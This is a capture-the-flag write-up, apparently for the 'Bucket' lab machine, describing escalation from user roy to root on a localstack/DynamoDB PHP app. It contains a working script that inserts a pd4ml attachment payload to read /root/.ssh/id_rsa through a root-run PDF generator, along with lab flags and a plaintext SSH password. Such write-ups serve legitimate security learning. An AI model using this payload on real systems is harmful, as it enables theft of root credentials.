# Shell as roy
First, let's grab the user flag:

```bash
roy@bucket:~$ ls
project  user.txt
roy@bucket:~$ cat user.txt 
4dd0d95b7d4d3ae734486bee60548a17
```

Then we can look in the `project` directory:

```bash
roy@bucket:~$ cd project
roy@bucket:~/project$ ls -la
total 44
drwxr-xr-x  3 roy roy  4096 Sep 24  2020 .
drwxr-xr-x  4 roy roy  4096 Apr 29 09:16 ..
-rw-rw-r--  1 roy roy    63 Sep 24  2020 composer.json
-rw-rw-r--  1 roy roy 20533 Sep 24  2020 composer.lock
-rw-r--r--  1 roy roy   367 Sep 24  2020 db.php
drwxrwxr-x 10 roy roy  4096 Sep 24  2020 vendor
roy@bucket:~/project$ cat db.php 
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

I was hoping for a password, but it seems there isn't much of interest here.

## Basic Linux Enumeration

I ran some basic commands to see what was happening on the box.

### Processes

`ps aux` showed us that [localstack](https://github.com/localstack/localstack) was running as root - this is the program that is being used to create the local AWS infrastructure.

```bash
roy@bucket:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND

...[snip]...

root        1481  0.0  0.0   1568     4 ?        S    04:19   0:01 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err
root        1505  0.0  0.0   1156   668 ?        S    04:19   0:00 make infra
root        1506  0.4  3.4 144656 137396 ?       Sl   04:19   1:20 python bin/localstack start --host
```

It turns out `localstack` does actually support IAM, but I suppose somehow this box was configured not to use IAM credentials.

### Network Connections

`netstat` shows some local connections (namely port 4566, which hosts the 'edge service' for `localstack`) and outgoing connections to my box.

```bash
roy@bucket:/var/www/bucket-app$ netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      1 10.10.10.212:32934      1.0.0.1:domain          SYN_SENT   
tcp        0      0 localhost:4566          localhost:57954         TIME_WAIT  
tcp        0      0 localhost:4566          localhost:57960         TIME_WAIT  
tcp        0      0 10.10.10.212:42766      10.10.14.65:9001        ESTABLISHED
tcp        0    300 10.10.10.212:ssh        10.10.14.65:46656       ESTABLISHED
tcp6       1      0 10.10.10.212:http       10.10.14.65:33984       CLOSE_WAIT 
udp        0      0 localhost:60184         localhost:domain        ESTABLISHED
udp        0      0 10.10.10.212:42214      1.0.0.1:domain          ESTABLISHED
```

Interestingly, `netstat` does not show a crucial service - the local web application running on port 8000. I would discover this by accident when I tried to start my own with `php -S localhost:8000` later on, and was told the port was already in use. Luckily, running `ss -lntp` instead reveals the server:

```bash
roy@bucket:/var/www/bucket-app/files$ ss -lntp
State                Recv-Q               Send-Q                             Local Address:Port                              Peer Address:Port              Process                                      
LISTEN               0                    511                                    127.0.0.1:8000                                   0.0.0.0:*                                                              
LISTEN               0                    4096                                   127.0.0.1:9999                                   0.0.0.0:*                  users:(("php",pid=31321,fd=4))              
LISTEN               0                    4096                                   127.0.0.1:39185                                  0.0.0.0:*                                                              
LISTEN               0                    4096                               127.0.0.53%lo:53                                     0.0.0.0:*                                                              
LISTEN               0                    4096                                   127.0.0.1:4566                                   0.0.0.0:*                                                              
LISTEN               0                    128                                      0.0.0.0:22                                     0.0.0.0:*                                                              
LISTEN               0                    511                                            *:80                                           *:*                                                              
LISTEN               0                    128                                         [::]:22                                        [::]:*                                   
```

It also doesn't show up in `ps aux`, so there is no way to verify which user it runs as. We later find out it has root privileges, and there is one `/usr/sbin/apache2 -k start` process running as root, so I suspect that is the underlying process that started the server.

After looking at some other writeups, it seems `netstat -tnl` would have revealed the webserver. An alternative would have been to look in `/etc/apache2/sites-enabled/000-default.conf` to see what sites are enabled on the box. [0xdf's writeup](https://0xdf.gitlab.io/2021/04/24/htb-bucket.html#web-1) explains this process.

### Linpeas

I did run [[Linux Enumeration#Linpeas|Linpeas]], but it didn't throw up much useful information. The highlights were the presence of the `.aws` directory, which we had already found, and a potential `at` exploit.

```bash
[+] Unexpected folders in root
/cdrom
/.aws

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)

```

However, I suspected this wasn't the path to root, and it would instead be something to do with AWS or the local application that we found slightly earlier.

## bucket-app

There is a php-based web app in this directory:

```bash
roy@bucket:~/project/vendor$ cd /var/www/bucket-app
roy@bucket:/var/www/bucket-app$ ls -la
total 856
drwxr-x---+  4 root root   4096 Feb 10 12:29 .
drwxr-xr-x   4 root root   4096 Feb 10 12:29 ..
-rw-r-x---+  1 root root     63 Sep 23  2020 composer.json
-rw-r-x---+  1 root root  20533 Sep 23  2020 composer.lock
drwxr-x---+  2 root root   4096 Feb 10 12:29 files
-rwxr-x---+  1 root root  17222 Sep 23  2020 index.php
-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
drwxr-x---+ 10 root root   4096 Feb 10 12:29 vendor
```

Besides an amusing misspelling of skyscraper, the PHP code at the top is the only interesting part:

![[Pasted image 20210429102509.png]]

It seems to create a PDF file using the contents of a file on the box. It reads which file to turn into a PDF from the database' `alerts` table - which does not currently exist.

There are a few steps here - it seems the path to root involves inserting some malicious data into the database with the title "Ransomware", then triggering the server to create a PDF using the `data` attribute supplied. If the server is running as root, we can use it to read a sensitive file. To trigger this, we need to send it a `POST` request.

I have left out a lot of details regarding debugging and troubleshooting steps I made - however, there are still a few necessary steps before the exploit works, including creating the alerts table. However, you can still [[20 - Shell as roy#Final Payload - Downloading Root Private Key|skip to the final payload]] if you wish.

### Accessing the Local Site

When I first did this box, I missed the fact that the local webserver was already running at first, and tried to start my own on port 9999 with `php -S localhost:9999`. This sent me down a rabbit hole when, in the final step, my exploit could not access the root flag (as it was running as `roy`).

Being aware of this mistake, when I redid this box I knew I had to instead [[Linux Networking#With SSH|setup an SSH tunnel]] from my local host to port 8000 on the remote machine. To do this we use the following command and input the password `n2vM-<_K_Q:.Aa2`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ ssh -L 8000:localhost:8000 roy@10.10.10.212
roy@10.10.10.212's password: 
...[snip]...
roy@bucket:~$
```

Now we can navigate to `localhost:8000` and view the 'local' site on the remote machine!

![[Pasted image 20210429110814.png]]

### Testing the Web App

Now we can send requests to the server from our box, and see the response in our SSH terminal tab.

*Note:* this debugging used the PHP server that was running as `roy` from my first attempt at this box. While setting this up was initially a mistake, it proved extremely useful in debugging the application, as it allowed me to see error messages. However, making this PHP server is not necessary to complete the box. It also requires tunneling to whatever port roy's server is using, rather than to port 8000, using the command `ssh -L 8000:localhost:X roy@10.10.10.212`.

For example, let's test the basic `POST` functionality. Then we can start to debug it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ curl -d 'action=get_alerts' localhost:8000
```

On our SSH connection to `roy` we see:

```bash
[Thu Apr 29 10:21:14 2021] 127.0.0.1:59706 [500]: POST / - Uncaught Aws\Exception\CredentialsException: Cannot read credentials from /home/roy/.aws/credentials in /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Credentials/CredentialProvider.php:838
Stack trace:
#0 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Credentials/CredentialProvider.php(516): Aws\Credentials\CredentialProvider::reject()
#1 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Middleware.php(121): Aws\Credentials\CredentialProvider::Aws\Credentials\{closure}()
#2 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/RetryMiddleware.php(275): Aws\Middleware::Aws\{closure}()
#3 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Middleware.php(206): Aws\RetryMiddleware->__invoke()
#4 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/StreamRequestPayloadMiddleware.php(83): Aws\Middleware::Aws\{closure}()
#5 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/EndpointParameterMiddleware.php(87): Aws\StreamRequestPayloadMiddleware->__invoke()
#6 /var/www/bucket-app/vendor/aws/aws-sdk-php/src/ClientResolver.php(690): Aws\Endp in /var/www/bucket-app/vendor/aws/aws-sdk-php/src/Credentials/CredentialProvider.php on line 838
```

So let's configure roy some arbitrary credentials:

```bash
roy@bucket:~$ aws configure
AWS Access Key ID [None]: 123123213
AWS Secret Access Key [None]: 123123123
Default region name [None]: us-east-1
Default output format [None]: 
```

Now when we send the request above, we get a different error instead:

```bash
[Thu Apr 29 10:23:24 2021] PHP Fatal error:  Uncaught exception 'Aws\DynamoDb\Exception\DynamoDbException' with message 'Error executing "Scan" on "http://localhost:4566"; AWS HTTP error: Client error: `POST http://localhost:4566` resulted in a `400 Bad Request` response:
{"__type":"com.amazonaws.dynamodb.v20120810#ResourceNotFoundException","message":"Cannot do operations on a non-existent (truncated...)
 ResourceNotFoundException (client): Cannot do operations on a non-existent table - {"__type":"com.amazonaws.dynamodb.v20120810#ResourceNotFoundException","message":"Cannot do operations on a non-existent table"}'

GuzzleHttp\Exception\ClientException: Client error: `POST http://localhost:4566` resulted in a `400 Bad Request` response:
{"__type":"com.amazonaws.dynamodb.v20120810#ResourceNotFoundException","message":"Cannot do operations on a non-existent (truncated...)
 in /var/www/bucket-app/vendor/guzzlehttp/guzzle/src/Exception/RequestException.php:111
Stack trace:
#0 /var/www/bucket-app/vendor/guzzlehttp/guzzle/src/Middleware.php(66): GuzzleHttp\Ex in /var/www/bucket-app/vendor/aws/aws-sdk-php/src/WrappedHttpHandler.php on line 195
```

This is progress!

#### Creating the Alerts Table

We can verify using the AWS CLI that the `alerts` table doesn't exist:

```bash
roy@bucket:~$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
{
    "TableNames": [
        "users"
    ]
}
```

I did some experimenting with DDB's `create-table` function and settled on the following command:

```
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
```

AWS' [DDB documentation](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/create-table.html) was very helpful here. The key parts of the command are as follows:
- `table-name alerts` creates our alerts table
- `--key-schema AttributeName=title,KeyType=HASH` defines our primary key as the `title` field. It is the only field referenced in the PHP code, so I just set it as the primary key
	- (I initially tried setting a separate primary key and having a separate `title` attribute, but the number of keys needs to match the number of attributes, so I stripped it down to just one)
- `-attribute-definitions AttributeName=title,AttributeType=S` creates a `title` attribute with the type `S` (string)
- The `--provisioned-throughput` parameter makes little difference, but is required

You can use either your local machine or the SSH connection to do this command - you just need to change the `--endpoint-url`. For example, when I first did this box I was trying to hit `localhost:4566` as the endpoint URL from my Kali machine, and went down a long rabbit hole. Using the URL in the above command worked fine from kali, but if you wanted to execute this command in your SSH session you could do the following:

```bash
roy@bucket:~$ aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": 1619692610.834,
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": 0.0,
            "LastDecreaseDateTime": 0.0,
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}
```

We can then verify the table has been created:

```bash
roy@bucket:~$ aws --endpoint-url=http://localhost:4566 dynamodb list-tables
{
    "TableNames": [
        "alerts",
        "users"
    ]
}
```

Excellent.

### Scripting the Process

Trying to re-run our `curl` command again threw the non-existent table error, and re-running `list-tables` showed it had been deleted. This suggests there is a cleanup script running on the box. We could verify this by running [[Linux Enumeration#Process Monitoring with Pspy|pspy]], but I will take it as a given.

In our script we want to create the table, and then immediately put a malicious item in it. Let's start with listing the tables, then we can figure out our payload:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ddb]
└─$ cat create-and-curl 
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
```

Running this successfully creates our table.

#### Creating a Malicious Alert

Now we need to create an alert that will read a sensitive file. Looking at the code, the `title` field needs to equal "Ransomware", and then we can put whatever we like in the `data` field.

We use the `put-item` method to do this. [Reading the docs](https://docs.aws.amazon.com/cli/latest/reference/dynamodb/put-item.html) explains how to do this, and the method allows us to set our `data` attribute.

Let's go with `/root/.ssh/id_rsa` to read their private key.

Here's our initial script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ddb]
└─$ cat create-and-curl 
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
aws --endpoint-url=http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{ "title": {"S": "Ransomware"},"data": {"S": "/root/.ssh/id_rsa"} }' --return-consumed-capacity TOTAL
aws --endpoint-url=http://s3.bucket.htb dynamodb scan --table-name alerts

curl -X POST -d 'action=get_alerts' localhost:8000
sleep 0.5
wget localhost:8000/files/result.pdf
```

However, this does not work. We can't simply ask it to grab the ssh key - we need to put in a bit of extra work, and take a closer look at the Java `pd4ml` library. 

## Final Payload - Downloading Root Private Key

Specifically, we can use `pd4ml` to [create an attachment](https://pd4ml.com/cookbook/pdf-attachments.htm) in the PDF.

So now we update our `data` tag:

```
"data": {"S": "<html><pd4ml:attachment src='file:///root/.ssh/id_rsa' description='attachment sample' icon='Paperclip'/>"}
```

And we can use this as our malicious payload. We just have to escape some quotation marks:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/writeup_attempt]
└─$ cat create-and-curl 
aws --endpoint-url=http://s3.bucket.htb dynamodb create-table --table-name alerts --key-schema AttributeName=title,KeyType=HASH --attribute-definitions AttributeName=title,AttributeType=S --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
aws --endpoint-url=http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{ "title": {"S": "Ransomware"},"data": {"S": "<html><pd4ml:attachment src=\"file:///root/.ssh/id_rsa\" description=\"attachment sample\" icon=\"Paperclip\"/>"} }' --return-consumed-capacity TOTAL
aws --endpoint-url=http://s3.bucket.htb dynamodb scan --table-name alerts

curl -X POST -d 'action=get_alerts' localhost:8000
sleep 0.5
wget localhost:8000/files/result.pdf
```

And then run our script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/writeup_attempt]
└─$ ./create-and-curl 
{
    "TableDescription": {
        "AttributeDefinitions": [
            {
                "AttributeName": "title",
                "AttributeType": "S"
            }
        ],
        "TableName": "alerts",
        "KeySchema": [
            {
                "AttributeName": "title",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": "2021-04-29T12:54:29.454000+01:00",
        "ProvisionedThroughput": {
            "LastIncreaseDateTime": "1970-01-01T00:00:00+00:00",
            "LastDecreaseDateTime": "1970-01-01T00:00:00+00:00",
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        },
        "TableSizeBytes": 0,
        "ItemCount": 0,
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts"
    }
}
{
    "ConsumedCapacity": {
        "TableName": "alerts",
        "CapacityUnits": 1.0
    }
}
{
    "Items": [
        {
            "title": {
                "S": "Ransomware"
            },
            "data": {
                "S": "<html><pd4ml:attachment src=\"file:///root/.ssh/id_rsa\" description=\"attachment sample\" icon=\"Paperclip\"/>"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}
--2021-04-29 12:43:23--  http://localhost:8000/files/result.pdf
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19338 (19K) [application/pdf]
Saving to: ‘result.pdf.1’

result.pdf.1                                       100%[=============================================================================================================>]  18.88K  --.-KB/s    in 0s      

2021-04-29 12:43:23 (58.1 MB/s) - ‘result.pdf.1’ saved [19338/19338]
```

This outputs a pdf into our local filesystem:

![[Pasted image 20210429124611.png]]

Clicking the pin gives us the SSH key!

![[Pasted image 20210429124714.png]]

We can copy and paste and save this key, then SSH in as root:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ ssh -i root_ssh root@10.10.10.212
...[snip]...
root@bucket:~# cat root.txt 
d2d9f1dd102ca4d5bd9b9ebf62e3f604
```